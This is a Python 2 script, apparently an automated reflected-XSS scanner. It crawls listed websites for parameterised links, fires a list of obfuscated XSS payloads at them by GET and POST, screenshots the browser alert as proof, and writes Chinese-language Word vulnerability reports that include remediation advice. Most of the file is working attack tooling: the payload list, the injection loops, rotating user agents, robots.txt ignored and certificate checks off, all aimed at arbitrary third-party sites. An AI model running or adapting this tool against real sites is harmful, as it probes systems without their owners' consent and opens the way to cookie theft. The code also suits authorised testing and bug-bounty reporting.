    # -*- coding:utf-8 -*-
    #__author__:langzi
    #__blog__:www.langzi.fun
    import time
    from docx import Document
    from docx.shared import Pt
    from docx.shared import RGBColor
    from docx.oxml.ns import qn
    from docx.shared import Inches
    from selenium import webdriver
    from selenium.webdriver.support import expected_conditions as EC
    from PIL import ImageGrab
    # 输入屏幕左上角和右下角的坐标
    from string import whitespace
    import urllib
    import requests
    requests.packages.urllib3.disable_warnings()
    import re
    import urlparse
    import mechanize
    import httplib
    from bs4 import BeautifulSoup
    import random
    import sys
    reload(sys)
    sys.setdefaultencoding('utf-8')

    payload_1 = ['</script>"><script>prompt(1)</script>', ' and 1=2 <script>alert(1)</script>','</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>', '"><img src=x onerror=prompt(1)>', '"><svg/onload=prompt(1)>', '"><iframe/src=javascript:prompt(1)>', '"><h1 onclick=prompt(1)>Clickme</h1>', '"><a href=javascript:prompt(1)>Clickme</a>', '"><a href="javascript:confirm%28 1%29">Clickme</a>', '"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>', '"><textarea autofocus onfocus=prompt(1)>', '"><a/href=javascript&colon;co\\u006efir\\u006d&#40;&quot;1&quot;&#41;>clickme</a>', '"><script>co\\u006efir\\u006d`1`</script>', '"><ScRiPt>co\\u006efir\\u006d`1`</ScRiPt>', '"><img src=x onerror=co\\u006efir\\u006d`1`>', '"><svg/onload=co\\u006efir\\u006d`1`>', '"><iframe/src=javascript:co\\u006efir\\u006d%28 1%29>', '"><h1 onclick=co\\u006efir\\u006d(1)>Clickme</h1>', '"><a href=javascript:prompt%28 1%29>Clickme</a>', '"><a href="javascript:co\\u006efir\\u006d%28 1%29">Clickme</a>', '"><textarea autofocus onfocus=co\\u006efir\\u006d(1)>', '"><details/ontoggle=co\\u006efir\\u006d`1`>clickmeonchrome', '"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme', '"><img/src=x%0Aonerror=prompt`1`>', '"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">', '"><h1/ondrag=co\\u006efir\\u006d`1`)>DragMe</h1>']

    headerss = [
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
        "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]

    def writedata(x):
        with open('log.txt', 'a+')as aa:
            aa.write('***********************************' + '\n')
            aa.write(str(time.strftime('%Y-%m-%d:%H:%M:%S   ', time.localtime())) + str(x) + '\n')


    def get_links(url):
        '''
        需要的有常规的注入点
            1. category.php?id=17
            2. https://www.yamibuy.com/cn/brand.php?id=566
        伪静态
            1. info/1024/4857.htm
            2. http://news.hnu.edu.cn/zhyw/2017-11-11/19605.html
            3. http://www.labothery-tea.cn/chanpin/2018-07-12/4.html
        :param url:
        :return:
        '''
        # if 'gov.cn' in url or 'edu.cn' in url:
        #     #return 0
        #     pass
        domain = url.split('//')[1].strip('/').replace('www.', '')
        result = []
        id_links = []
        idid = []
        try:
            headers = {
                'User-Agent': random.choice(headerss),
                'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Cache-Control': 'max-age=0',
                'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
            }
            rxww = requests.get(url, headers=headers,verify=False, timeout=10)
            soup = BeautifulSoup(rxww.content, 'html.parser',from_encoding='iso-8859-1')
            links = soup.findAll('a')
            for link in links:
                _url = link.get('href')
                res = re.search('(javascript|:;|#|%)', str(_url))
                res1 = re.search('.(jpg|png|bmp|mp3|wma|wmv|gz|zip|rar|iso|pdf|txt)', str(_url))
                if res == None and res1 == None:
                    result.append(str(_url))
                else:
                    pass
            if result != []:
                rst = list(set(result))
                for rurl in rst:
                    if '//' in rurl and 'http' in rurl and domain in rurl:
                        # http // domain 都在
                        # https://www.yamibuy.com/cn/search.php?tags=163
                        # http://news.hnu.edu.cn/zhyw/2017-11-11/19605.html
                            if '?' in rurl and '=' in rurl:
                                id_links.append(rurl.strip())

                    # //wmw.dbw.cn/system/2018/09/25/001298805.shtml
                    if 'http' not in rurl and domain in rurl:
                        # http 不在    domain 在url
                        if '?' in rurl and '=' in rurl:
                            id_links.append('http://' + rurl.lstrip('/').strip())


                    # /chanpin/2018-07-12/3.html"
                    if 'http' not in rurl and domain not in rurl:
                        # http 不在  domain 不在
                        if '?' in rurl and '=' in rurl:
                            id_links.append('http://' + domain.strip() + '/' + rurl.strip().lstrip('/'))
                if len(id_links)>50:
                    id_links = random.sample(id_links,20)
                for x2 in id_links:
                    try:
                        rx2 = requests.get(url=x2, headers=headers,timeout=15)
                        if rx2.status_code == 200:
                            if rx2.url.find('=') > 0:
                                idid.append(rx2.url)
                                idid.append(x2)
                    except Exception as e:
                        pass
                idid=list(set(idid))
                ididx = []
                dic_11 = []
                dic_21 = []
                dic_31 = []
                dic_41 = []
                for i in idid:
                    path = urlparse.urlparse(i).path
                    if path.count('/') == 1:
                        dic_11.append(i)
                    if path.count('/') == 2:
                        dic_21.append(i)
                    if path.count('/') == 3:
                        dic_31.append(i)
                    if path.count('/') > 3:
                        dic_41.append(i)
                if dic_11:
                    ididx.append(random.choice(dic_11))
                if dic_21:
                    ididx.append(random.choice(dic_21))
                if dic_31:
                    ididx.append(random.choice(dic_31))
                if dic_41:
                    ididx.append(random.choice(dic_41))
            if ididx == []:
                return None
            else:
                return ididx
        except Exception as e:
            pass
        return None

    def run(url):
        status = 0
        profile = webdriver.FirefoxProfile()
        profile.accept_untrusted_certs = True
        driver = webdriver.Firefox(firefox_profile=profile)
        driver.set_page_load_timeout(20)
        try:
            driver.get(url)
            result = EC.alert_is_present()(driver)
            if result:
                time.sleep(10)
                pic = ImageGrab.grab(bbox=(20,31, 1266, 1016))
                # 指定坐标 左上角和右下角
                #pic = ImageGrab.grab()
                # 全屏截图
                pic.save('code.png')
                status = 1
        except Exception as e:
            print('浏览器位置粗错:{}'.format(str(e)))
            writedata('浏览器位置粗错1:'+str(e))
        finally:
            #sem.release()
            if driver:
                try:
                    driver.quit()
                except Exception as e:
                    writedata('浏览器位置粗错3:'+str(e))
            if status == 1:
                return True
            else:
                return None


    def main(url,keyword,method,payload):
        print('Check : {}'.format(url))
        res = run(url)
        if res != True:
            return None
        else:
            document = Document()
            DaHei = document.styles.add_style('DaHei', 1)
            # 设置字体尺寸
            DaHei.font.size = Pt(16)
            # 设置字体颜色
            DaHei.font.color.rgb = RGBColor(0, 0, 0)
            # 黑色
            # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
            # 居中文本
            DaHei.font.name = '仿宋'.decode('utf-8')
            DaHei._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋'.decode('utf-8'))

            ZhongHei = document.styles.add_style('ZhongHei', 1)
            # 设置字体尺寸
            ZhongHei.font.size = Pt(10)
            # 设置字体颜色
            ZhongHei.font.color.rgb = RGBColor(0, 0, 0)
            # 黑色
            # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
            # 居中文本
            ZhongHei.font.name = '仿宋'.decode('utf-8')
            ZhongHei._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋'.decode('utf-8'))

            ZhongHOng = document.styles.add_style('ZhongHOng', 1)
            # 设置字体尺寸
            ZhongHOng.font.size = Pt(9)
            # 设置字体颜色
            ZhongHOng.font.color.rgb = RGBColor(178, 34, 34)
            # 红色
            # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
            # 居中文本
            ZhongHOng.font.name = '仿宋'.decode('utf-8')
            ZhongHOng._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋'.decode('utf-8'))

            XiaoLv = document.styles.add_style('XiaoLv', 1)
            # 设置字体尺寸
            XiaoLv.font.size = Pt(6.5)
            # 设置字体颜色
            XiaoLv.font.color.rgb = RGBColor(0, 255, 0)
            # 绿色
            # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
            # 居中文本
            XiaoLv.font.name = '仿宋'.decode('utf-8')
            XiaoLv._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋'.decode('utf-8'))
            domain = url.replace(':','_').replace('/','_')
            try:
                filename = url.split('//')[1].split('/')[0] + '__页面存在反射型XSS漏洞.docx'
            except:
                filename = domain.replace(':', '_').replace('/', '_') + '__页面存在反射型XSS漏洞.docx'
            print('存在弹窗，可以深入...')
            document.add_paragraph('基本信息'.decode('utf-8'), 'Title')
            document.add_paragraph('漏洞类型：XSS跨站注入漏洞'.decode('utf-8'), 'Subtitle')
            document.add_paragraph('漏洞等级：中危'.decode('utf-8'), 'Subtitle')
            document.add_paragraph('厂商信息：此处需要手动搜索'.decode('utf-8'), 'Subtitle')
            document.add_page_break()

            document.add_paragraph('漏洞简述'.decode('utf-8'), 'Title')
            document.add_paragraph('漏洞描述'.decode('utf-8'), 'Subtitle')
            document.add_paragraph('跨站脚本攻击的英文全称是Cross Site Script，为了和样式表区分，缩写为XSS。发生的原因是网站将用户输入的内容输出到页面上，在这个过程中可能有恶意代码被浏览器执行。跨站脚本攻击,它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。'.decode('utf-8'), 'DaHei')
            document.add_paragraph('漏洞危害'.decode('utf-8'), 'Subtitle')
            document.add_paragraph(
               '''
            1.窃取cookies，读取目标网站的cookie发送到黑客的服务器上
            2.读取用户未公开的资料，如果：邮件列表或者内容、系统的客户资料，联系人列表等等。
    
               '''.decode('utf-8'),'DaHei')

            document.add_page_break()

            document.add_paragraph('漏洞详情'.decode('utf-8'), 'Title')
            document.add_paragraph('网站漏洞报表'.decode('utf-8'), 'Subtitle')
            document.add_paragraph('注入网址:'.decode('utf-8')+url,'ZhongHei')
            document.add_paragraph('漏洞参数:'.decode('utf-8')+keyword,'ZhongHei')
            document.add_paragraph('请求方式:'.decode('utf-8')+method,'ZhongHei')
            document.add_paragraph('攻击载荷:'.decode('utf-8')+payload,'ZhongHei')
            document.add_page_break()

            document.add_paragraph('网站漏洞复现(使用Firefox浏览器)'.decode('utf-8'), 'Subtitle')
            document.add_paragraph('访问链接'.decode('utf-8'),'DaHei')
            document.add_paragraph(url,'ZhongHOng')
            document.add_paragraph('返回结果'.decode('utf-8'),'DaHei')
            document.add_picture('code.png',width=Inches(7))
            document.add_paragraph('复现完成，验证存在反射型XSS漏洞'.decode('utf-8'),'DaHei')

            document.add_page_break()
            document.add_paragraph('修复建议'.decode('utf-8'), 'Title')
            document.add_paragraph('代码原理防护'.decode('utf-8'), 'Subtitle')
            document.add_paragraph('''
            1、	输入验证：某个数据被接受为可被显示或存储之前，使用标准输入验证机制，验证所有输入数据的长度、类型、语法以及业务规则。
            2、	输出编码：数据输出前，确保用户提交的数据已被正确进行entity编码，建议对所有字符进行编码而不仅局限于某个子集。
            3、	明确指定输出的编码方式：不要允许攻击者为你的用户选择编码方式(如ISO 8859-1或 UTF 8)。
            4、	注意黑名单验证方式的局限性：仅仅查找或替换一些字符(如"<" ">"或类似"script"的关键字)，很容易被XSS变种攻击绕过验证机制。
            5、	警惕规范化错误：验证输入之前，必须进行解码及规范化以符合应用程序当前的内部表示方法。请确定应用程序对同一输入不做两次解码。对客户端提交的数据进行过滤，一般建议过滤掉双引号（”）、尖括号（<、>）等特殊字符，或者对客户端提交的数据中包含的特殊字符进行实体转换，比如将双引号（”）转换成其实体形式&quot;，<对应的实体形式是&lt;，<对应的实体形式是&gt;
            '''.decode('utf-8'),'DaHei')

            document.save(filename.decode('utf-8'))
            return 'XSS'

    def GET(url,level):
        print 'GET Level %s : '%level + url
        try:
            try:
                site = url
                finalurl = urlparse.urlparse(site)
                urldata = urlparse.parse_qsl(finalurl.query)
                domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
                domain = domain0.replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                connection = httplib.HTTPConnection(domain)
                connection.connect()
                url = site
                paraname = []
                paravalue = []
                payloads = []
                if level == 1:
                    payloads = payload_1

                o = urlparse.urlparse(site)
                parameters = urlparse.parse_qs(o.query, keep_blank_values=True)
                path = urlparse.urlparse(site).scheme + "://" + urlparse.urlparse(site).netloc + urlparse.urlparse(
                    site).path
                for para in parameters:  # Arranging parameters and values.
                    for i in parameters[para]:
                        paraname.append(para)
                        paravalue.append(i)
                # 定义
                fpar = []
                progress = 0
                for pn, pv in zip(paraname, paravalue):  # Scanning the parameter.
                    fpar.append(str(pn))
                    for x in payloads:  #
                        validate = x.translate(None, whitespace)
                        if validate == "":
                            progress = progress + 1
                        else:
                            progress = progress + 1
                            enc = urllib.quote_plus(x)
                            data = path + "?" + pn + "=" + pv + enc
                            page = urllib.urlopen(data)
                            sourcecode = page.read()
                            if x in sourcecode:
                                res = main(url=url+x,method='GET',keyword=pn,payload=x)
                                with open('result.txt','a+')as a:
                                    a.write('检测网址 : '+url + '\n')
                                    a.write('提交方式 : GET' + '\n')
                                    a.write('漏洞参数 : '+pn+'\n')
                                    a.write('攻击载荷 : '+x+'\n')
                                    a.write('------------------------------------\n')
                                if res == 'XSS':
                                    return res

            except:
                pass
        except:
            pass

    def POST(domains,data,level):
        print 'POST Level %s : '%level + domains + '?' + data
        try:
            try:
                try:
                    br = mechanize.Browser()
                    br.addheaders = [('User-agent',
                                      'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11')]
                    br.set_handle_robots(False)
                    br.set_handle_refresh(False)
                    site = domains
                    finalurl = urlparse.urlparse(site)
                    urldata = urlparse.parse_qsl(finalurl.query)
                    domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
                    domain = domain0.replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                    connection = httplib.HTTPConnection(domain)
                    connection.connect()
                    path = urlparse.urlparse(site).scheme + "://" + urlparse.urlparse(site).netloc + urlparse.urlparse(
                        site).path

                    url = site
                    param = data
                    payloads = []
                    if level == 1:
                        payloads = payload_1

                    lop = str(len(payloads))
                    params = "http://www.analyz3r.cn/?" + param
                    finalurl = urlparse.urlparse(params)
                    urldata = urlparse.parse_qsl(finalurl.query)
                    o = urlparse.urlparse(params)
                    parameters = urlparse.parse_qs(o.query, keep_blank_values=True)
                    paraname = []
                    paravalue = []
                    for para in parameters:  # Arranging parameters and values.
                        for i in parameters[para]:
                            paraname.append(para)
                            paravalue.append(i)
                    fpar = []
                    fresult = []
                    total = 0
                    progress = 0
                    pname1 = []  # parameter name
                    payload1 = []
                    for pn, pv in zip(paraname, paravalue):  # Scanning the parameter.
                        fpar.append(str(pn))
                        for i in payloads:
                            validate = i.translate(None, whitespace)
                            if validate == "":
                                progress = progress + 1
                            else:
                                progress = progress + 1
                                pname1.append(pn)
                                payload1.append(str(i))
                                d4rk = 0
                                for m in range(len(paraname)):
                                    d = paraname[d4rk]
                                    d1 = paravalue[d4rk]
                                    tst = "".join(pname1)
                                    tst1 = "".join(d)
                                    if pn in d:
                                        d4rk = d4rk + 1
                                    else:
                                        d4rk = d4rk + 1
                                        pname1.append(str(d))
                                        payload1.append(str(d1))
                                data = urllib.urlencode(dict(zip(pname1, payload1)))
                                r = br.open(path, data)
                                sourcecode = r.read()
                                pname1 = []
                                payload1 = []
                                if i in sourcecode:
                                    res = main(url=domains+'?'+data, method='POST', keyword=pn, payload=i)
                                    with open('result.txt', 'a+')as a:
                                        a.write('检测网址 : ' + domains + '?' + data + '\n')
                                        a.write('提交方式 : POST' +  '\n')
                                        a.write('漏洞参数 : ' + pn + '\n')
                                        a.write('攻击载荷 : ' + i + '\n')
                                        a.write('------------------------------------\n')
                                    if res == 'XSS':
                                        return res
                except:
                    pass
            except:
                pass
        except Exception,e:
            print e

    def get_xss(url,level=1):
        try:
            link = get_links(url)
            #print link
            if link == None:
                pass
            else:
                for i in link:
                    # print(i)
                    res1 = GET(i,level=level)
                    if res1 == 'XSS':
                        return
                    domain,data = i.split('?')[0],i.split('?')[1]
                    res2 = POST(domains=domain,data=data,level=level)
                    if res2 == 'XSS':
                        return
        except Exception as e:
            pass

    if __name__ == '__main__':

        New_start = raw_input('Input your target text:')
        print New_start
        all_urls = list(set([x.strip() for x in open(New_start,'r').readlines()]))
        for i in all_urls:
            get_xss(i,1)





